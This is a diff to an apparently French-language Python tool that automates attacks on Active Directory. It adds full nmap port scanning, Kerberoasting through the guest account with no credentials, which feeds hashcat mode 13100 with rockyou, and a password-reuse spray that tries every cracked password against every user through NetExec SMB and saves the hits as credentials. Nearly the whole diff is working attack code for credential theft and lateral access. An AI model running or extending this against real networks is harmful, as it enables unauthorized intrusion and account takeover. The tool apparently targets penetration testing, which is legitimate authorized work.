@@ -128,6 +128,29 @@ AD_PORTS = {
 # signaux forts de Domain Controller (Kerberos + LDAP + SMB, souvent GC)
 DC_SIGNAL = {88, 389, 445}
 
+# services courants NON-AD (souvent le foothold : web, ftp, rpc-http...) -> scannes par defaut
+COMMON_PORTS = {
+    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http", 110: "pop3",
+    111: "rpcbind", 143: "imap", 443: "https", 465: "smtps", 587: "smtp",
+    593: "rpc-http", 873: "rsync", 993: "imaps", 995: "pop3s", 2049: "nfs",
+    3306: "mysql", 5357: "wsdapi", 5432: "postgres", 6379: "redis",
+    8000: "http-alt", 8008: "http-alt", 8080: "http-alt", 8443: "https-alt",
+    8888: "http-alt", 9090: "http-alt", 10000: "webmin",
+}
+PORT_NAMES = {**COMMON_PORTS, **AD_PORTS}   # AD prioritaire pour le nom
+
+def default_ports():
+    """Ports par defaut : AD + services courants (ne rate plus le web/ftp/rpc-http)."""
+    return sorted(set(AD_PORTS) | set(COMMON_PORTS))
+
+def full_scan_nmap(ip, timeout=1200):
+    """Scan complet 1-65535 via nmap (rapide, -p-) -> liste des ports ouverts."""
+    if not shutil.which("nmap"):
+        return None
+    rc, out, _ = run_cmd(["nmap", "-p-", "-T4", "--open", "-Pn",
+                          "--min-rate", "1500", ip], timeout)
+    return [int(m.group(1)) for m in re.finditer(r"^(\d+)/tcp\s+open", out, re.M)]
+
 # ----------------------------------------------------------------------
 # Scan de ports (pur python, threade)
 # ----------------------------------------------------------------------
@@ -323,12 +346,30 @@ def smb_null_info(ip, timeout=5):
 # ----------------------------------------------------------------------
 def phase0_discovery(targets, args):
     stage("PHASE 0 - DECOUVERTE")
-    ports = sorted(p for p in AD_PORTS if p < 65536)
-    log(f"{C.GR}[i] Scan de {len(targets)} hote(s) sur {len(ports)} ports AD...{C.X}")
-    audit(f"PHASE0 scan {len(targets)} hosts")
-    found = scan_network(targets, ports, threads=args.threads, timeout=args.timeout)
+    audit(f"PHASE0 scan {len(targets)} hosts full={getattr(args,'full',False)}")
+    found = {}
+    if getattr(args, "full", False) and shutil.which("nmap"):
+        # scan COMPLET 1-65535 via nmap (ne rate aucun port ouvert)
+        log(f"{C.GR}[i] Scan COMPLET (-p-) via nmap sur {len(targets)} hote(s) "
+            f"(peut etre long)...{C.X}")
+        for ip in targets:
+            op = full_scan_nmap(ip)
+            if op:
+                found[ip] = op
+    else:
+        if getattr(args, "full", False):
+            ports = list(range(1, 65536))
+            log(f"{C.Y}[i] Scan COMPLET 1-65535 en pur-python (long, installe nmap pour +vite)...{C.X}")
+        elif getattr(args, "ports", None):
+            ports = [int(p) for p in re.split(r"[,\s]+", args.ports) if p.isdigit()]
+            log(f"{C.GR}[i] Scan de {len(ports)} port(s) demandes sur {len(targets)} hote(s)...{C.X}")
+        else:
+            ports = default_ports()
+            log(f"{C.GR}[i] Scan de {len(ports)} ports (AD + services courants) sur "
+                f"{len(targets)} hote(s)... (-p- / --full pour tout){C.X}")
+        found = scan_network(targets, ports, threads=args.threads, timeout=args.timeout)
     if not found:
-        log(f"{C.R}[!] Aucun hote avec un port AD ouvert. Verifie le reseau/scope.{C.X}")
+        log(f"{C.R}[!] Aucun port ouvert trouve. Verifie le reseau/scope (ou essaie --full).{C.X}")
         return {}
 
     hosts = {}
@@ -338,7 +379,7 @@ def phase0_discovery(targets, args):
         op = found[ip]
         is_dc = DC_SIGNAL.issubset(set(op)) or 3268 in op or 464 in op
         rec = {"ip": ip, "ports": op, "is_dc": is_dc,
-               "services": {p: AD_PORTS[p] for p in op if p in AD_PORTS}}
+               "services": {p: PORT_NAMES.get(p, "?") for p in op}}
         # enrichissement sur SMB
         if 445 in op:
             smb = smb2_probe(ip)
@@ -369,7 +410,7 @@ def phase0_discovery(targets, args):
     # affichage
     for ip, rec in hosts.items():
         tag = f"{C.R}{C.BD}[DC]{C.X} " if rec["is_dc"] else ""
-        svc = " ".join(f"{p}/{AD_PORTS.get(p,'?')}" for p in rec["ports"])
+        svc = " ".join(f"{p}/{PORT_NAMES.get(p,'?')}" for p in rec["ports"])
         log(f"\n  {tag}{C.G}{C.BD}{ip}{C.X}  {C.GR}{svc}{C.X}")
         name = rec.get("dns_hostname") or rec.get("smb_hostname")
         if name:
@@ -392,7 +433,7 @@ def phase0_discovery(targets, args):
             log(f"      horloge  : ecart {col}{sk:+d}s{C.X}{warn}")
         # table ports / service / version (nmap -sV sur les DC si nmap present)
         ver = nmap_versions(ip, rec["ports"]) if rec["is_dc"] else {}
-        prows = [[p, "tcp", ver.get(p, (AD_PORTS.get(p, "?"), ""))[0],
+        prows = [[p, "tcp", ver.get(p, (PORT_NAMES.get(p, "?"), ""))[0],
                   (ver.get(p, ("", ""))[1] or "")[:48]] for p in rec["ports"]]
         show_table(["PORT", "PROTO", "SERVICE", "VERSION"], prows, C.G, cap=40)
         save_table(args, f"ports_{ip}.txt", ["PORT", "PROTO", "SERVICE", "VERSION"], prows)
@@ -670,11 +711,49 @@ def phase1_unauth(hosts, args, state):
     elif roast_users:
         log(f"{C.GR}[i] {len(roast_users)} candidats (seed, non valides) -> AS-REP en aveugle.{C.X}")
 
-    # AS-REP roasting (sans creds)
+    # AS-REP roasting + Kerberoast via Guest (foothold sans creds valides)
     phase_asrep(dc, args, state, label="non-auth")
-    # l'AS-REP est un gain SANS creds -> on crack tout de suite (nourrit la suite)
+    kerberoast_guest(args, state, dc)
+    # gains SANS creds -> on crack tout de suite (nourrit la suite)
     if state.get("hashes"):
         crack_hashes(args, state)
+
+def kerberoast_guest(args, state, dc):
+    """Kerberoast via Guest / session anonyme (foothold sans creds valides, cf. Op. Endgame)."""
+    nxc = nxc_bin()
+    if not (nxc and args.domain):
+        return
+    outfile = os.path.join(args.loot, "kerberoast.hashes")
+    log(f"{C.GR}[i] {nxc} : Kerberoast via Guest (sans creds)...{C.X}")
+    rc, out, _ = run_cmd([nxc, "ldap", dc, "-u", "guest", "-p", "", "-d", args.domain,
+                          "--kerberoasting", outfile], 180)
+    if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
+        add_finding(state, "HIGH", "Kerberoast via Guest (sans creds valides)",
+                    f"hashcat -m 13100 {outfile} rockyou.txt", dc)
+        state.setdefault("hashes", {})["kerberoast"] = outfile
+
+def spray_reuse(args, state, dc):
+    """Reutilisation de mot de passe : spray les mdp DEJA trouves sur TOUS les users."""
+    nxc = nxc_bin()
+    ufile = os.path.join(args.loot, "users.txt")
+    sprayed = state.setdefault("_sprayed", set())
+    pwds = [c["password"] for c in state.get("creds", [])
+            if c.get("password") and c["password"] not in sprayed]
+    if not (nxc and os.path.isfile(ufile) and pwds):
+        return
+    log(f"{C.GR}[i] Reutilisation de mdp : spray de {len(set(pwds))} mdp connu(s) sur les users...{C.X}")
+    for pw in set(pwds):
+        sprayed.add(pw)
+        rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pw, "--continue-on-success"]
+                             + (["-d", args.domain] if args.domain else []), 300)
+        for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
+            user = m.group(2)
+            if not any(c.get("user") == user and c.get("password") == pw
+                       for c in state.get("creds", [])):
+                state.setdefault("creds", []).append(
+                    {"user": user, "password": pw, "hash": None, "src": "reuse"})
+                add_finding(state, "HIGH", f"Reutilisation de mot de passe : {user}:{pw}",
+                            "meme mdp qu'un autre compte -> re-enum (boucle)", dc)
 
 def phase_asrep(dc, args, state, label=""):
     """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
@@ -1406,6 +1485,8 @@ def phase3_authenum(hosts, args, state):
     # analyse BloodHound (DCSync/deleg/high-value) + crack (reinjecte les creds)
     bloodhound_analyze(args, state)
     crack_hashes(args, state)
+    # reutilisation de mot de passe : spray les mdp craques sur tous les users
+    spray_reuse(args, state, dc)
 
 # ======================================================================
 # PHASE 4 : ESCALADE & LATERAL
@@ -2006,6 +2087,9 @@ def main():
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
     p.add_argument("--passwordlist", help="Wordlist de mots de passe pour le spray (defaut: liste integree)")
     p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
+    p.add_argument("-p-", "--full", dest="full", action="store_true",
+                   help="Scan COMPLET des 65535 ports (via nmap si present) - ne rate aucun port")
+    p.add_argument("--ports", help="Ports a scanner (ex: 80,443,8080) au lieu du set par defaut")
     p.add_argument("-t", "--threads", type=int, default=100, help="Threads scan (defaut 100)")
     p.add_argument("--timeout", type=float, default=1.2, help="Timeout port (defaut 1.2s)")
     p.add_argument("-o", "--loot", default="loot", help="Dossier de sortie (defaut loot/)")
